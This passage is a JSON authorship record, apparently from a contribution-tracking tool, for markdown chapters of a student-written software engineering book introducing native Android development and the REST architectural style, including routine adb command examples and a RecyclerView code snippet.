        "content": "However, having a wide variety of Android phones is a double-edged sword. The Android ecosystem is quite [fragmented](https://www.androidauthority.com/android-version-distribution-748439/), with mainly 5 Android versions being installed in Android devices today.  It is also more difficult to test Android apps because these apps have to work on all these different devices and it is impossible to test on all Android phones. Your app will have to cater to a wider range of phones with [different resolutions](https://stackoverflow.com/questions/7587854/is-there-a-list-of-screen-resolutions-for-all-android-based-phones-and-tablets) and pixel density. It is also tougher to get your apps noticed on the Google Play Store due to a huge number of apps being released everyday. Often, you will have to get featured by Google Play Store and be placed on the main page before anyone will notice your app."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## 1.3 Why Should I Make Native Android Apps?"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "There are many ways to develop an app. Native apps are those created specifically for the mobile operating system. For Android, it means that you will use Java or Kotlin with the Android SDK and Google\u0027s official tools like Android Studio, just like how it is detailed in this book chapter."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "So you might then consider developing a web app instead, or even a [progressive web app](https://developers.google.com/web/progressive-web-apps/) which are loaded in browsers like Chrome and Firefox, using Javascript, CSS and HTML. This means that the user does not need to download your app and your app can directly be accessed from the web. However, web apps often use the same user interface for both Apple and Android phones and this might not feel integrated with the rest of the phone because Apple and Android apps usually use [different interaction design patterns](https://medium.com/@vedantha/interaction-design-patterns-ios-vs-android-111055f8a9b7). Additionally, web apps often suffer from the lack of functionality. Thus web apps will not fully replace the need for native Android apps."
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "Then, there are [hybrid apps](https://blog.techmagic.co/native-vs-hybrid-apps/). Creating a hybrid app using hybrid mobile frameworks such as Ionic and React Native allow us to develop for both Android and Apple at the same time (just like web apps), while allowing us to access device-only features such as the camera or GPS. Indeed, a cross-platform approach is appealing for people looking to quickly develop an app. However, you might end up using more time trying to tweak the app to improve its performance and UI to suit both platforms. Developing a native app is still the best way to ensure performance, security, a responsive and integrated user interface and access to native APIs."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "Until hybrid mobile frameworks catch up with native apps and can fully replace native development, there are often more benefits to developing native apps."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### 1.4 Develop Your First App Today!"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "The official programming language for Android development is Java, however, Android announced its support for Kotlin in 2017([source](https://android-developers.googleblog.com/2017/05/android-announces-support-for-kotlin.html)). Fret not, even if you are not an expert in either of those programming languages, you still can learn how to create your first app. Here\u0027s how."
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "- Start by downloading the latest version of [Android Studio](https://developer.android.com/studio/index.html), the official IDE for Android. The installation should come with the Android Software Development Kit (SDK) needed for Android development."
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "- Build your first app by going through the \u0027App Basics\u0027 tutorials at Google\u0027s Developer Guides [here](https://developer.android.com/training/basics/firstapp/index.html). If you prefer to watch a video instead of reading text, check out the [free Udacity course on Android Fundamentals](https://www.udacity.com/course/new-android-fundamentals--ud851), which is the first course of their [Android Developer Nanodegree](https://www.udacity.com/course/android-developer-nanodegree-by-google--nd801)."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- For more experienced programmers, popular Android development courses include those by Stanford at [their Android App Development module page](https://web.stanford.edu/class/cs193a/) and [Udemy\u0027s paid courses](https://www.udemy.com/courses/search/?q\u003dandroid\u0026src\u003dukw). A good book for Android would be the [Android Programming: The Big Nerd Ranch Guide](https://www.bignerdranch.com/books/android-programming/)."
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- To learn Android development at your own pace, check out the comprehensive [Vogella Android tutorials](https://www.vogella.com/tutorials/android.html), which cover almost everything you would need to know. There are also open-source crowdsourced [guides by CodePath](https://guides.codepath.com/android)."
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## 2. Android is Not Magic"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "Here is a quick preview of some basic Android concepts to whet your appetite and to demystify Android app development!"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "### 2.1 App Components"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "App components are building blocks of an Android app. You can easily build an Android app with App components, even if you are not an UI/UX master!"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "Some app component examples include:"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "#### Activities"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "An `Activity` represents a single screen with a user interface. For example, an event app could have an `Activity` to login, an `Activity` to view the event schedule and another `Activity` to search for locations."
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "#### Layouts"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "`Layouts` defines a user interface structure for an `Activity`. They specify how each child   `View` will be placed. For example, [ConstraintLayout](https://developer.android.com/training/constraint-layout/index.html) allows you to define constraints between views that will lead to a more responsive UI. Often, apps also need to display a scrolling list of elements and this is where [RecyclerView](https://developer.android.com/guide/topics/ui/layout/recyclerview.html) comes in handy. The `RecyclerView` is very versatile. It can be used to easily create apps like the one below:"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "![RecyclerView Example](https://i.imgur.com/vbIL5HA.gif)"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "([Image](https://i.imgur.com/vbIL5HA.gif) from [Codepath](https://guides.codepath.com/android/using-the-recyclerview))"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "It can also be used to create apps that will benefit from a Grid or Staggered Grid. For example, to have a Staggered Grid, you just need a few lines of Java code as seen below:"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "```Java"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "// First parameter is number of columns and second param is orientation i.e Vertical or Horizontal"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "StaggeredGridLayoutManager gridLayoutManager \u003d new StaggeredGridLayoutManager(2, StaggeredGridLayoutManager.VERTICAL);"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "// Attach the layout manager to the recycler view"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "recyclerView.setLayoutManager(gridLayoutManager);"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "Sample code is from [Codepath](https://guides.codepath.com/android/using-the-recyclerview)."
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "The app with a Staggered Grid will then look like this:"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "![Staggered Grid Example](https://i.imgur.com/AlANFgj.png)"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "([Image](https://i.imgur.com/AlANFgj.png) from [Codepath](https://guides.codepath.com/android/using-the-recyclerview))"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "You can also build a `Layout` easily using [Android Layout Editor](https://developer.android.com/studio/write/layout-editor.html)."
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "For further information, Google I/O 2016 introduces `Layouts` in [this video](https://www.youtube.com/watch?v\u003dsO9aX87hq9c\u0026t\u003d207s)."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "#### Fragments"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "`Fragments` are like \u0027sub activities\u0027 that allow for code reuse in different activities. Tablets and handsets can choose to display these fragments differently due to the difference in screen size, thus with Fragments, you can easily cater for mobile devices with different resolutions!"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "![Fragments Example](https://camo.githubusercontent.com/b768afff0888fcb8cbe1704b0609b53110276969/687474703a2f2f646576656c6f7065722e616e64726f69642e636f6d2f696d616765732f66756e64616d656e74616c732f667261676d656e74732e706e67)"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "(Image from [Codepath](https://github.com/codepath/android_guides/wiki/Creating-and-Using-Fragments))"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "Learn more about `Fragments` in [this video from Google I/O 2016](https://www.youtube.com/watch?v\u003dk3IT-IJ0J98\u0026t\u003d618s)."
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "### 2.2 Activity Lifecycle"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "You might wonder, how can I deal with scenarios where the user switch to another app? What if they rotate their phone? Don\u0027t worry, you will have control over your app as the user interacts with your app differently. Control is given to you using the `Activity Lifecycle`. With the `Activity Lifecycle`, your app can be notified every time the app changes its state, for example, when the app is being paused."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "![Activity Lifecycle](https://developer.android.com/guide/components/images/activity_lifecycle.png)"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "([Image](https://developer.android.com/guide/components/images/activity_lifecycle.png) from Google)"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "### 2.3 The Architecture of Android"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "Developing for Android used to be a daunting task as apps needed to be reactive to data changes, responsive to users and yet deal with the entire `Activity Lifecycle`. At Google I/O 2017, [Architecture Components](https://developer.android.com/topic/libraries/architecture/index.html) were introduced to help developers solve common issues by following best practices and implementing recommended architecture, so you can focus on building better apps!"
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "## 3. Useful Android Developer Tools"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "Android is a huge eco-system with a large developer community. Combined with the fact that it is Open Source, it is unsurprising to know that there are many useful developer tools for Android out there."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "### 3.1 Testing"
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "Testing used to be a nightmare for app development but since 2017, Test-driven development was [encouraged](https://www.youtube.com/watch?v\u003dpK7W5npkhho) by Google in their Google I/O 2017 due to the release of the `Android Testing Support Library`. You can read more about the library [here](https://developer.android.com/topic/libraries/testing-support-library/index.html). Now that we can do testing easily, we can build more reliable apps!"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "#### Unit Testing and Mocking"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Mocking is usually needed in unit testing to simulate the behaviour of real objects (that are dependencies) to verify the behaviour of the object that you are testing. In Android app development, [Mockito](https://site.mockito.org/), a popular mocking library for unit tests in Java, is often used. However, due to the difficulty of mocking the Android SDK to create unit tests, [Robolectric](http://robolectric.org/) was developed to solve this issue. Robolectric can still be used alongside Mockito. The benefit of Robolectric is that it handles emulation UI code such that tests that rely on the UI can be run on the Java Virtual Machine (JVM) rather than having to run them on an emulator. In other words, tests can be written and run faster."
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "#### Integration Testing"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "Integration testing and end-to-end testing is usually done using [Espresso](https://developer.android.com/training/testing/espresso/index.html). You can even record your own UI tests using the [Espresso Test Recorder](https://developer.android.com/studio/test/espresso-test-recorder.html) to save time! Be sure to check out the Espresso [cheatsheet](https://developer.android.com/training/testing/espresso/cheat-sheet.html) for easy writing of tests."
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "### 3.2 Debugging"
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "#### On-Device Developer Options"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"https://developer.android.com/studio/images/run/dev-options-pixel_2x.png\" width\u003d\"250\"\u003e"
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": "([Image](https://developer.android.com/studio/images/run/dev-options-pixel_2x.png) from Google)"
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": "Developer Options is a great tool for developers (and Android power users) to make system configurations and profile and debug apps. To enable it, just go to `Settings` and tap the `Build Number` 7 times on any Android phone."
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": "#### Android Studio"
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 162,
        "author": {
          "gitId": "-"
        },
        "content": "Android Studio provides an in-house debugger and also an Android Emulator that uses an Android Virtual Device (AVD) that models a device type. For example, you can test your app on an AVD configuration for the Nexus 5X phone. You can also target the Android version that the phone should use. Each AVD will have a dedicated storage area on your machine. The AVD Manager in Android Studio allows you to create and manage AVDs."
      },
      {
        "lineNumber": 163,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 164,
        "author": {
          "gitId": "-"
        },
        "content": "![AVD Manager](https://developer.android.com/studio/images/run/avd-manager_2x.png)"
      },
      {
        "lineNumber": 165,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 166,
        "author": {
          "gitId": "-"
        },
        "content": "([Image](https://developer.android.com/studio/images/run/avd-manager_2x.png) from Google)"
      },
      {
        "lineNumber": 167,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 168,
        "author": {
          "gitId": "-"
        },
        "content": "#### Android Debug Bridge (adb)"
      },
      {
        "lineNumber": 169,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 170,
        "author": {
          "gitId": "-"
        },
        "content": "Android Debug Bridge (adb) is a useful advanced command-line tool included with the Android Software Development Kit (SDK). It allows you to communicate with an Android device by issuing commands such as:"
      },
      {
        "lineNumber": 171,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 172,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 173,
        "author": {
          "gitId": "-"
        },
        "content": "adb install C:\\package.apk – Installs the package located at C:\\package.apk on your computer on your device."
      },
      {
        "lineNumber": 174,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 175,
        "author": {
          "gitId": "-"
        },
        "content": "adb uninstall package.name – Uninstalls the package with package.name from your device. For example, you’d use the name com.rovio.angrybirds to uninstall the Angry Birds app."
      },
      {
        "lineNumber": 176,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 177,
        "author": {
          "gitId": "-"
        },
        "content": "adb push C:\\file /sdcard/file – Pushes a file from your computer to your device. For example, the command here pushes the file located at C:\\file on your computer to /sdcard/file on your device"
      },
      {
        "lineNumber": 178,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 179,
        "author": {
          "gitId": "-"
        },
        "content": "adb pull /sdcard/file C:\\file – Pulls a file from your device to your computer – works like adb push, but in reverse."
      },
      {
        "lineNumber": 180,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 181,
        "author": {
          "gitId": "-"
        },
        "content": "adb logcat – View your Android device’s log. Can be useful for debugging apps."
      },
      {
        "lineNumber": 182,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 183,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 184,
        "author": {
          "gitId": "-"
        },
        "content": "Command examples from [How-To Geek](https://www.howtogeek.com/125769/how-to-install-and-use-abd-the-android-debug-bridge-utility/)."
      },
      {
        "lineNumber": 185,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 186,
        "author": {
          "gitId": "-"
        },
        "content": "## 4. Further Readings"
      },
      {
        "lineNumber": 187,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 188,
        "author": {
          "gitId": "-"
        },
        "content": "Going further, it will be useful to know more about:"
      },
      {
        "lineNumber": 189,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Firebase](https://firebase.google.com/), a mobile platform provided by Google that provides various services to grow and monetise your app."
      },
      {
        "lineNumber": 190,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Reactive Programming with RxJava](https://blog.mindorks.com/rxjava-anatomy-what-is-rxjava-how-rxjava-is-designed-and-how-rxjava-works-d357b3aca586)."
      },
      {
        "lineNumber": 191,
        "author": {
          "gitId": "-"
        },
        "content": "*   [RxJava](https://medium.com/@kevalpatel2106/code-your-next-android-app-using-rxjava-d1db30ac9fcc), a Java VM implementation of ReactiveX (Reactive Extensions): a library for composing asynchronous and event-based programs by using observable sequences."
      },
      {
        "lineNumber": 192,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Realm](https://realm.io/), a NoSQL object-orientated mobile database system."
      },
      {
        "lineNumber": 193,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Android Debug Bridge](https://developer.android.com/studio/command-line/adb.html), a powerful command line tool for Android."
      },
      {
        "lineNumber": 194,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Advanced Android Expresso](https://academy.realm.io/posts/chiu-ki-chan-advanced-android-espresso-testing/), the automated testing tool for Android UI tests."
      },
      {
        "lineNumber": 195,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 196,
        "author": {
          "gitId": "-"
        },
        "content": "Other useful links:"
      },
      {
        "lineNumber": 197,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Android Authority](https://www.androidauthority.com)"
      },
      {
        "lineNumber": 198,
        "author": {
          "gitId": "-"
        },
        "content": "*   [Android Central](https://www.androidcentral.com/)"
      },
      {
        "lineNumber": 199,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 200,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 3,
      "jamessspanggg": 4,
      "-": 193
    }
  },
  {
    "path": "contents/architecture/RESTArchitecturalStyle.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: REST Architectural Style"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# REST Architectural Style"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Author: [Wen Xin](https://github.com/wenmogu)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## Overview "
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "REST stands for *Representational State Transfer*. It is the architecture style of the World Wide Web. In particular,"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "* It embodies a set of guiding principles the Web should follow such that it can be efficient and widely applicable."
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "* It serves as the model for Web protocols e.g. HTTP."
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "* It describes the nature of [RESTful API](https://openclassrooms.com/courses/build-your-web-projects-with-rest-apis/examples-of-rest-apis),  the type of API that are widely used to provide/consume services over the Web."
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "Let us learn a bit more about REST so that we can better understand the rationale behind the design of the Web and better design/consume RESTful APIs."
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What Does REST Mean?"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "### Resource"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "Before we understand the name *Representational State Transfer*, we have to understand the term *resource*. In the context of REST, *resource* is used as the way to organize and represent data/information. Roy Fielding, the originator of REST, states in his paper that “any information that can be named can be a resource”, and the identification of resources is done by using unique identifiers of the resources i.e. unique name of the resources. The information represented by one resource can change at any time, but the name of the resource i.e. the identifier of the resource has to remain the same for identification purposes. For example, the student list of a computer science course with course code CS3281 can be named as “CS3281StudentList”, and hence can be a resource. The student list might change over time, e.g. from those who enrolled in Year 2017 to those who enrolled in Year 2018, but the identifier “CS3281StudentList” always refers to the student list regardless of its state/value. "
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "As the combination of various types (video, audio, hyperlinks, text…) of information into one unit is becoming more common (e.g. in an online article teaching the reader how to use IntelliJ, there would be text describing the process, videos giving demonstrations and hyperlinks directing the reader to other articles), using an encompassing term to represent a unit of information makes sense as that is how the user organizes information. Moreover, this abstraction saves us the trouble of distinguishing the types or implementation of information inside this unit when thinking of the process of accessing and transmitting this unit of information."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "### Representational State"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "Resource and the term *representational state* are closely related to the client-server model outlined as one of the rules of REST. Resource is the information stored at the server, whereas what are given/transfered to the clients when they access the resource are actually the \"representations\" of the resource at a specific point of time, i.e. the *representational state* of the resource. "
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "### Representational State Transfer"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "Transfering to the users the representation of the resource instead of the resources itself allows [dynamic binding](https://en.wikipedia.org/wiki/Late_binding) of the reference to a representation of the resource, and this enables the users to have access to and operate on this resource in the formats they want, such as JSON, HTML, XML etc. When the user wishes to make some changes to the resource, he/she can change the representation of this resource and send the representation back to server to update the resource. As such, the server is freed from managing different [application states](https://ruben.verborgh.org/phd/hypermedia/#the-statelessness-constraint-p-8) across requests. "
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "The quote below from Roy Fielding outlines what the name entails:"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e The name “Representational State Transfer” is intended to evoke an image of how a well-designed Web application behaves: a network of web pages (a virtual state-machine), where the user progresses through the application by selecting links (state transitions), resulting in the next page (representing the next state of the application) being transferred to the user and rendered for their use."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What Should REST Bring to the Web?"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
